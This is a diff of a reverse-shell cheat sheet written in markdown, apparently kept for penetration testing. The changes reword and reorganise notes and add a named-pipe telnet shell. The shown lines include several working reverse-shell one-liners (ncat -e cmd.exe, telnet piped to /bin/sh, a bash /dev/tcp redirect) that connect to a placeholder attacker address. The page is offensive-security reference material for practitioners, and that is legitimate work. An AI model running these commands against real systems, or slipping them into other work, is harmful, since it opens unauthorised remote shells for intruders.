@@ -32,7 +32,7 @@ And therein lies the problem. Bind shells are great, but they're irresponsible. 
 
 Don't be lazy. You shouldn't be trying to get a shell back unless you have a good idea of what the underlying OS is. Each one of these can be adjusted and may need to be. It's possible you know you have a linux type OS, but what if bash is in /usr/bin/ instead of /bin/? Do some recon, know what you're working with, and, if you really have every reason to believe you should be getting a shell but you aren't, always assume you've done something wrong. It's usually the safe bet.  
 
-###PHP
+### PHP
 
 This is a very generic PHP reverse shell. It runs PHP inside of itself to send a connection back with /bin/sh
 
@@ -73,13 +73,11 @@ ncat -v <attackIP> 443 -e cmd.exe --ssl
 
 ### Non-netcat Shells
 
-This one is really clunky, but it works when you just can't get anything else working.
+This one is really clunky, but it works when you just can't get anything else working. For this to work, you need two listeners and your shell will show up on the second one. It's a complete mess, but it works and it's just kind of nifty to see.
 
 ~~~
 telnet <ATTACKIP> 443 | /bin/sh | telnet <ATTACKIP> 444
 ~~~
-
-For this to work, you need two listeners and your shell will show up on the second one. It's a complete mess, but it works and it's just kind of nifty to see. 
 
 This one came from [this](https://twitter.com/webpentest/status/424165659518316544) tweet and it's interesting. 
 
@@ -87,6 +85,11 @@ This one came from [this](https://twitter.com/webpentest/status/4241656595183165
 /bin/bash -l > /dev/tcp/<ATTACKIP>/<ATTACKPORT> 0<&1 2>&1
 ~~~
 
+Another interesting telnet shell
+
+~~~
+rm -f /tmp/p; mknod /tmp/p p && telnet <ATTACKIP> <ATTACKPORT> 0/tmp/p
+~~~
 
 
 
@@ -98,6 +101,6 @@ This one came from [this](https://twitter.com/webpentest/status/4241656595183165
 These are some great resources for some of the shells I've included above. Learn from others, modify it, and share!
 
 
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
-http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
+[The one](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) everyone seems to link 
+[Variations](https://highon.coffee/blog/reverse-shell-cheat-sheet/) on the theme.
+[Oldy](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html) but goody
